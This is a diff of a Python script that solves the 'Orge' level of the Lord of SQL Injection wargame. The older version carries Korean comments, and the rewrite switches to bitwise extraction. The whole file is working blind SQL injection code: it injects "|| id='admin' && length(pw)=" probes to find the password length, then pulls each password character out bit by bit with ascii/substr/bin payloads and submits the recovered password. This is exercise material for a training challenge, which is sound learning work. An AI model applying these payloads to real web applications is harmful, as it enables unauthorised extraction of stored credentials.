@@ -1,53 +1,64 @@
-# -*- coding : UTF-8 -*-
-from requests import get
-import string
+#!/usr/bin/python
+# coding: utf-8
+
+import requests
+from sys import stdout
 
 print("#### Lord of SQL Injection - Orge ####\n")
 
-# URL을 설정합니다.
 url = "http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php"
 
-#쿠키를 세팅합니다. 반드시 당신의 쿠키로 설정해야 합니다.
-cookies = dict(PHPSESSID="5u71g5vp7547tv8ffl7osl0fl5")
-abc = string.digits + string.ascii_letters                  #ASCII의 문자를 저장합니다. (브루트포스할 때 필요)
-result = ""
+session = raw_input("Input your LOS session : ")
+# session = "lqaa55h0s48l8h06rc9sguktt0"
 
-#pw의 길이를 게싱합니다.
-for i in range(1,20):
-    param = "?pw=1' || id='admin' %26%26 LENGTH(pw)=" + str(i) + "%23"
-    new_url = url + param
-    r = get(new_url, cookies=cookies)
+headers = {
+    'Cookie': 'PHPSESSID={0}'.format(session)
+}
+
+password = ""
+query = 0
+
+
+# guess the length of password
+for i in range(100):
+    param = "?pw=' || id='admin' %26%26 length(pw)={0}%23".format(i)
+    r = requests.get(url + param, headers=headers)
+    query += 1
 
     if r.text.find("<h2>Hello admin</h2>") > 0:
-        idLength = i + 1
-        print("pw의 길이는 " + str(i) + " 입니다.")
+        length = i
+        print "[*] The length of 'pw' is {0}".format(i)
         break
 
 
-#얻은 정보를 바탕으로 블라인드 SQL Injection을 진행합니다.
+
+print "[*] the password : ",
+stdout.flush()
+
 print("\n\n#### Starting Blind SQL Injection ####\n")
-for i in range(1, idLength):
-    for a in abc:
-        param = "?pw=1' || id='admin' %26%26 ASCII(SUBSTR(pw, " + str(i) + ", 1))=" + str(ord(a)) + "%23"
-        new_url = url + param
-        r = get(new_url, cookies=cookies)
+for i in range(1, length + 1):
+    binary = ''
+    for j in range(0, 8):
+        param = "?pw=' || id='admin' %26%26 (select substr(lpad(bin(ascii(substr(pw,{0},1))),7,0),{1},1)=1)%23".format(i, j)
+        content = requests.get(url + param, headers=headers).text
+        query += 1
 
-        if r.text.find("<h2>Hello admin</h2>") > 0:
-            print(str(i) + "번 째 pw의 값은 '" + a + "' 입니다. ")
-            result += a
-            break
+        if content.find("Hello admin") > 0:
+            binary += '1'
+        else:
+            binary += '0'
 
-    if i == 1 and result == "":
-        print("FAIL")
-        exit(0)
+    password += chr(int(binary, 2))
 
-    if i == idLength-1:
-        print("\n\n#### RESULT ####")
-        print("pw : " + result)
+    print chr(int(binary, 2)), "({0})".format(binary)
+    stdout.flush()
 
-url = "http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw=" + result
-r = get(url, cookies=cookies)
+print "\n[*] the password : ", password
+
+
+url = "http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw=" + password
+r = requests.get(url, headers=headers)
 
 if r.text.find("<h2>ORGE Clear!</h2>") > 0:
-    print("축하합니다! Orge를 클리어했습니다.")
+    print("Orge Clear!")
     
